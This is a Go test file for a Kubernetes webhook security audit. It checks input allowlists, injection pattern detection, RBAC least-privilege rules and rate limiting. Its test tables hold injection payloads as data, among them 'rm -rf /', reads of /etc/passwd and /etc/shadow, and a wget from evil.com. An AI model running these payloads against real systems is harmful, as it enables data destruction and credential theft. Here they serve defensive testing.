package security

import (
	"fmt"
	"regexp"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	rbacv1 "k8s.io/api/rbac/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

// =============================================================================
// K8s 1.35 Webhook Security Audit Tests
// Validates findings from docs/security/k8s-135-audit.md
// =============================================================================

// TestSQLInjectionPrevention verifies that SQL injection payloads are blocked
// by the webhook character allowlist and pattern detection.
func TestSQLInjectionPrevention(t *testing.T) {
	allowedChars := regexp.MustCompile(`^[a-zA-Z0-9\s\-_.,;:()\[\]]*$`)

	sqlPayloads := []struct {
		name               string
		payload            string
		blockedByAllowlist bool
		reason             string
	}{
		{
			name:               "Classic OR injection with quotes",
			payload:            "' OR '1'='1",
			blockedByAllowlist: true,
			reason:             "Single quotes not in allowlist",
		},
		{
			name:               "UNION SELECT with asterisk",
			payload:            "1 UNION SELECT * FROM users--",
			blockedByAllowlist: true,
			reason:             "Asterisk and double-dash not in allowlist",
		},
		{
			name:               "DROP TABLE with quotes and semicolons",
			payload:            "'; DROP TABLE networkintents;--",
			blockedByAllowlist: true,
			reason:             "Single quotes and double-dash not in allowlist",
		},
		{
			name:               "URL-encoded SQL injection",
			payload:            "1%20OR%201=1",
			blockedByAllowlist: true,
			reason:             "Percent sign and equals not in allowlist",
		},
		{
			name:               "SQL with hash comment",
			payload:            "admin'#",
			blockedByAllowlist: true,
			reason:             "Single quotes and hash not in allowlist",
		},
	}

	for _, tt := range sqlPayloads {
		t.Run(tt.name, func(t *testing.T) {
			blockedByAllowlist := !allowedChars.MatchString(tt.payload)
			assert.Equal(t, tt.blockedByAllowlist, blockedByAllowlist,
				"Allowlist check for %q: %s", tt.payload, tt.reason)
		})
	}
}

// TestSQLPatternDetection verifies secondary pattern detection for SQL-like
// payloads that pass the character allowlist (no special chars).
func TestSQLPatternDetection(t *testing.T) {
	suspiciousPatterns := []string{
		"drop table", "delete from", "insert into", "select from",
		"union select", "exec sp", "exec xp", "or 1=1",
	}

	spacedPatterns := []string{
		"d r o p", "s e l e c t", "d e l e t e", "i n s e r t", "e x e c",
	}

	tests := []struct {
		name     string
		input    string
		detected bool
	}{
		{"DROP TABLE", "drop table networkintents", true},
		{"DELETE FROM", "delete from users", true},
		{"UNION SELECT", "union select passwords", true},
		{"Spaced DROP", "d r o p  t a b l e", true},
		{"Spaced SELECT", "s e l e c t  passwords", true},
		{"Legitimate intent", "deploy AMF in production namespace", false},
		{"Legitimate scaling", "scale UPF to 5 replicas", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			inputLower := strings.ToLower(tt.input)
			detected := false

			for _, pattern := range suspiciousPatterns {
				if strings.Contains(inputLower, pattern) {
					detected = true
					break
				}
			}
			if !detected {
				for _, pattern := range spacedPatterns {
					if strings.Contains(inputLower, pattern) {
						detected = true
						break
					}
				}
			}

			assert.Equal(t, tt.detected, detected,
				"Pattern detection for %q", tt.input)
		})
	}
}

// TestXSSPreventionByAllowlist verifies that XSS payloads with characters
// outside the allowlist are blocked.
func TestXSSPreventionByAllowlist(t *testing.T) {
	allowedChars := regexp.MustCompile(`^[a-zA-Z0-9\s\-_.,;:()\[\]]*$`)

	xssPayloads := []struct {
		name    string
		payload string
	}{
		{"Script tag", "<script>alert('xss')</script>"},
		{"Event handler", "<img onerror=alert(1) src=x>"},
		{"Data URI", "data:text/html,<script>alert(1)</script>"},
		{"SVG onload", "<svg onload=alert(1)>"},
		{"Encoded script", "%3Cscript%3Ealert(1)%3C/script%3E"},
		{"Template literal", "${alert(1)}"},
		{"Backtick execution", "`alert(1)`"},
		{"Double-encoded", "&#x3C;script&#x3E;"},
	}

	for _, tt := range xssPayloads {
		t.Run(tt.name, func(t *testing.T) {
			assert.False(t, allowedChars.MatchString(tt.payload),
				"XSS payload must be blocked by character allowlist: %q", tt.payload)
		})
	}
}

// TestXSSProtocolPayloadsRequirePatternDetection documents that protocol-based
// XSS payloads (javascript:, vbscript:) pass the character allowlist because
// colon and parentheses are allowed. These MUST be caught by pattern detection.
// See audit finding W-02.
func TestXSSProtocolPayloadsRequirePatternDetection(t *testing.T) {
	allowedChars := regexp.MustCompile(`^[a-zA-Z0-9\s\-_.,;:()\[\]]*$`)

	// These pass the character allowlist but must be caught by pattern detection
	protocolPayloads := []struct {
		name    string
		payload string
	}{
		{"JavaScript URI", "javascript:alert(1)"},
		{"VBScript URI", "vbscript:MsgBox(1)"},
	}

	// Secondary patterns that should catch these
	dangerousPatterns := []string{
		"javascript:", "vbscript:", "<script", "onload=", "onerror=",
	}

	for _, tt := range protocolPayloads {
		t.Run(tt.name, func(t *testing.T) {
			// Document: these pass the character allowlist (colon and parens are allowed)
			passesAllowlist := allowedChars.MatchString(tt.payload)
			assert.True(t, passesAllowlist,
				"AUDIT W-02: Protocol payload %q passes character allowlist - must be caught by pattern detection", tt.payload)

			// Verify pattern detection catches them
			caughtByPattern := false
			payloadLower := strings.ToLower(tt.payload)
			for _, pattern := range dangerousPatterns {
				if strings.Contains(payloadLower, pattern) {
					caughtByPattern = true
					break
				}
			}
			assert.True(t, caughtByPattern,
				"Pattern detection must catch protocol-based XSS: %q", tt.payload)
		})
	}
}

// TestCommandInjectionPrevention verifies that command injection payloads are blocked.
func TestCommandInjectionPrevention(t *testing.T) {
	allowedChars := regexp.MustCompile(`^[a-zA-Z0-9\s\-_.,;:()\[\]]*$`)

	cmdPayloads := []struct {
		name    string
		payload string
	}{
		{"Pipe command", "| cat /etc/passwd"},
		{"Semicolon chain with special chars", "; rm -rf /"},
		{"Backtick execution", "`whoami`"},
		{"Dollar subshell", "$(id)"},
		{"Ampersand background", "& wget evil.com/shell.sh"},
		{"Redirect output", "> /tmp/exploit"},
		{"Redirect input", "< /etc/shadow"},
		{"Newline injection", "valid\n/bin/sh"},
		{"Null byte injection", "valid\x00/bin/sh"},
		{"Environment variable", "$HOME"},
	}

	for _, tt := range cmdPayloads {
		t.Run(tt.name, func(t *testing.T) {
			assert.False(t, allowedChars.MatchString(tt.payload),
				"Command injection payload must be blocked: %q", tt.payload)
		})
	}
}

// TestPathTraversalPrevention verifies that path traversal attacks are blocked.
func TestPathTraversalPrevention(t *testing.T) {
	allowedChars := regexp.MustCompile(`^[a-zA-Z0-9\s\-_.,;:()\[\]]*$`)

	traversalPayloads := []struct {
		name    string
		payload string
	}{
		{"Basic traversal", "../../../etc/passwd"},
		{"Windows traversal", "..\\..\\..\\windows\\system32"},
		{"URL encoded", "%2e%2e%2f%2e%2e%2f"},
		{"Double encoded", "%252e%252e%252f"},
		{"Absolute path", "/etc/passwd"},
	}

	for _, tt := range traversalPayloads {
		t.Run(tt.name, func(t *testing.T) {
			assert.False(t, allowedChars.MatchString(tt.payload),
				"Path traversal payload must be blocked: %q", tt.payload)
		})
	}
}

// TestUnicodeWhitespaceBypass verifies Unicode whitespace handling.
// Documents audit finding W-02 regarding \s matching Unicode whitespace.
func TestUnicodeWhitespaceBypass(t *testing.T) {
	// Recommended fix: use explicit ASCII whitespace only
	allowedCharsFixed := regexp.MustCompile(`^[a-zA-Z0-9 \t\n\r\-_.,;:()\[\]]*$`)

	unicodeWhitespace := []struct {
		name    string
		payload string
		desc    string
	}{
		{"Zero-width space", "deploy\u200BAMF", "U+200B ZERO WIDTH SPACE"},
		{"Zero-width non-joiner", "deploy\u200CAMF", "U+200C ZERO WIDTH NON-JOINER"},
		{"Ideographic space", "deploy\u3000AMF", "U+3000 IDEOGRAPHIC SPACE"},
		{"No-break space", "deploy\u00A0AMF", "U+00A0 NO-BREAK SPACE"},
	}

	for _, tt := range unicodeWhitespace {
		t.Run(tt.name, func(t *testing.T) {
			passesFixedRegex := allowedCharsFixed.MatchString(tt.payload)
			assert.False(t, passesFixedRegex,
				"Fixed regex should block Unicode whitespace %s in: %q", tt.desc, tt.payload)
		})
	}
}

// TestErrorMessageSanitization verifies that sensitive patterns in error messages
// can be detected and should be sanitized before returning to users.
func TestErrorMessageSanitization(t *testing.T) {
	sensitivePatterns := []*regexp.Regexp{
		regexp.MustCompile(`\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b`), // IP addresses
		regexp.MustCompile(`:\d{4,5}\b`),                             // Port numbers
		regexp.MustCompile(`github\.com/`),                           // Go package paths
		regexp.MustCompile(`(?i)(/[a-z0-9_\-]+)+\.go`),               // Go file paths
	}

	internalErrors := []string{
		"failed to connect to 10.0.0.5:8080: connection refused",
		"github.com/thc1006/nephoran-intent-operator/pkg/webhooks/networkintent_webhook.go:200",
		"dial tcp 192.168.1.100:5432: connect: connection refused",
	}

	for _, errMsg := range internalErrors {
		t.Run(errMsg[:30], func(t *testing.T) {
			containsSensitive := false
			for _, pattern := range sensitivePatterns {
				if pattern.MatchString(errMsg) {
					containsSensitive = true
					break
				}
			}
			assert.True(t, containsSensitive,
				"Error message contains sensitive data that must be sanitized: %q", errMsg)
		})
	}
}

// TestRBACLeastPrivilege validates RBAC roles follow least privilege principle.
func TestRBACLeastPrivilege(t *testing.T) {
	tests := []struct {
		name      string
		role      rbacv1.ClusterRole
		wantError bool
		errorMsg  string
	}{
		{
			name: "Reject wildcard resources",
			role: rbacv1.ClusterRole{
				ObjectMeta: metav1.ObjectMeta{Name: "bad-role"},
				Rules: []rbacv1.PolicyRule{
					{APIGroups: []string{"nephoran.com"}, Resources: []string{"*"}, Verbs: []string{"get"}},
				},
			},
			wantError: true,
			errorMsg:  "wildcard resource",
		},
		{
			name: "Reject wildcard verbs",
			role: rbacv1.ClusterRole{
				ObjectMeta: metav1.ObjectMeta{Name: "bad-role"},
				Rules: []rbacv1.PolicyRule{
					{APIGroups: []string{"nephoran.com"}, Resources: []string{"networkintents"}, Verbs: []string{"*"}},
				},
			},
			wantError: true,
			errorMsg:  "wildcard verb",
		},
		{
			name: "Reject wildcard API groups",
			role: rbacv1.ClusterRole{
				ObjectMeta: metav1.ObjectMeta{Name: "bad-role"},
				Rules: []rbacv1.PolicyRule{
					{APIGroups: []string{"*"}, Resources: []string{"networkintents"}, Verbs: []string{"get"}},
				},
			},
			wantError: true,
			errorMsg:  "wildcard API group",
		},
		{
			name: "Reject escalate privilege",
			role: rbacv1.ClusterRole{
				ObjectMeta: metav1.ObjectMeta{Name: "bad-role"},
				Rules: []rbacv1.PolicyRule{
					{APIGroups: []string{"rbac.authorization.k8s.io"}, Resources: []string{"clusterroles"}, Verbs: []string{"escalate"}},
				},
			},
			wantError: true,
			errorMsg:  "escalate",
		},
		{
			name: "Reject broad secret access without resourceNames",
			role: rbacv1.ClusterRole{
				ObjectMeta: metav1.ObjectMeta{Name: "bad-role"},
				Rules: []rbacv1.PolicyRule{
					{APIGroups: []string{""}, Resources: []string{"secrets"}, Verbs: []string{"get", "list"}},
				},
			},
			wantError: true,
			errorMsg:  "secret",
		},
		{
			name: "Accept specific permissions",
			role: rbacv1.ClusterRole{
				ObjectMeta: metav1.ObjectMeta{Name: "good-role"},
				Rules: []rbacv1.PolicyRule{
					{APIGroups: []string{"nephoran.com"}, Resources: []string{"networkintents"}, Verbs: []string{"get", "list", "watch"}},
				},
			},
			wantError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateRBACLeastPrivilege(tt.role)
			if tt.wantError {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errorMsg)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// TestRateLimiterThreadSafety verifies concurrent access to a rate limiter
// does not cause data races or panics.
func TestRateLimiterThreadSafety(t *testing.T) {
	type SafeRateLimiter struct {
		mu       sync.Mutex
		requests map[string]int
		limit    int
	}

	rl := &SafeRateLimiter{
		requests: make(map[string]int),
		limit:    100,
	}

	isAllowed := func(ip string) bool {
		rl.mu.Lock()
		defer rl.mu.Unlock()
		if rl.requests[ip] >= rl.limit {
			return false
		}
		rl.requests[ip]++
		return true
	}

	var wg sync.WaitGroup
	goroutines := 100
	requestsPerGoroutine := 10

	wg.Add(goroutines)
	for i := 0; i < goroutines; i++ {
		go func(id int) {
			defer wg.Done()
			ip := fmt.Sprintf("10.0.0.%d", id%10)
			for j := 0; j < requestsPerGoroutine; j++ {
				isAllowed(ip)
			}
		}(i)
	}

	wg.Wait()

	rl.mu.Lock()
	totalRequests := 0
	for _, count := range rl.requests {
		totalRequests += count
		assert.LessOrEqual(t, count, rl.limit, "Rate limiter should enforce per-IP limit")
	}
	rl.mu.Unlock()

	assert.Greater(t, totalRequests, 0, "Some requests should have been processed")
	t.Logf("Processed %d total requests across %d IPs without data races", totalRequests, len(rl.requests))
}

// TestBase64EncodingDetection verifies detection of suspiciously long
// alphanumeric sequences that may be encoded payloads.
func TestBase64EncodingDetection(t *testing.T) {
	alphanumericPattern := regexp.MustCompile(`[A-Za-z0-9]{40,}`)

	tests := []struct {
		name     string
		input    string
		detected bool
	}{
		{"Short legitimate text", "deploy AMF network function", false},
		{"Base64-like encoded payload", "PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4K", true},
		{"Long random string (40 chars)", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", true},
		{"39 chars (below threshold)", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			matches := alphanumericPattern.FindAllString(tt.input, -1)
			if tt.detected {
				assert.Greater(t, len(matches), 0,
					"Long alphanumeric sequence should be detected: %q", tt.input)
			} else {
				assert.Equal(t, 0, len(matches),
					"Should not trigger encoding detection: %q", tt.input)
			}
		})
	}
}

// TestWebhookCharacterAllowlist validates the allowlist comprehensively.
func TestWebhookCharacterAllowlist(t *testing.T) {
	allowedChars := regexp.MustCompile(`^[a-zA-Z0-9\s\-_.,;:()\[\]]*$`)

	t.Run("AllowedCharacters", func(t *testing.T) {
		validInputs := []string{
			"deploy AMF in production namespace",
			"scale UPF to 5 replicas",
			"configure network slice (urllc) with QoS",
			"setup near-rt-ric with xapp_framework_v1",
			"deploy O-RAN components: o-du, o-cu, o-ru",
			"scaling [amf, smf] in namespace nephoran-system",
		}

		for _, input := range validInputs {
			assert.True(t, allowedChars.MatchString(input),
				"Valid telecom intent should pass allowlist: %q", input)
		}
	})

	t.Run("BlockedCharacters", func(t *testing.T) {
		blockedChars := []string{
			"<", ">", "\"", "'", "`", "$", "\\", "/",
			"{", "}", "|", "&", "!", "@", "#", "%",
			"^", "~", "+", "=", "?",
		}

		for _, char := range blockedChars {
			input := "test" + char + "input"
			assert.False(t, allowedChars.MatchString(input),
				"Character %q must be blocked by allowlist", char)
		}
	})
}

// TestReplicasBoundaryValidation tests replica count boundary conditions.
func TestReplicasBoundaryValidation(t *testing.T) {
	tests := []struct {
		name       string
		replicas   int32
		valid      bool
		hasWarning bool
	}{
		{"Zero replicas", 0, true, false},
		{"One replica", 1, true, false},
		{"Normal replicas", 5, true, false},
		{"High replicas", 100, true, false},
		{"Very high replicas (warning)", 101, true, true},
		{"Extremely high replicas", 1000, true, true},
		{"Negative replicas", -1, false, false},
		{"Large negative", -100, false, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			isValid := tt.replicas >= 0
			assert.Equal(t, tt.valid, isValid,
				"Replicas %d validity should be %v", tt.replicas, tt.valid)
			if tt.hasWarning && isValid {
				assert.True(t, tt.replicas > 100,
					"Warning should be issued for replicas > 100")
			}
		})
	}
}

// =============================================================================
// Helper functions
// =============================================================================

func validateRBACLeastPrivilege(role rbacv1.ClusterRole) error {
	for _, rule := range role.Rules {
		for _, apiGroup := range rule.APIGroups {
			if apiGroup == "*" {
				return fmt.Errorf("wildcard API group not allowed in role %s", role.Name)
			}
		}
		for _, resource := range rule.Resources {
			if resource == "*" {
				return fmt.Errorf("wildcard resource not allowed in role %s", role.Name)
			}
		}
		for _, verb := range rule.Verbs {
			if verb == "*" {
				return fmt.Errorf("wildcard verb not allowed in role %s", role.Name)
			}
		}
		for _, verb := range rule.Verbs {
			if verb == "escalate" || verb == "bind" {
				return fmt.Errorf("verb %q not allowed - potential privilege escalate", verb)
			}
		}
		for _, resource := range rule.Resources {
			if resource == "secrets" && len(rule.ResourceNames) == 0 {
				return fmt.Errorf("broad secret access not allowed without resourceNames restriction")
			}
		}
	}
	return nil
}
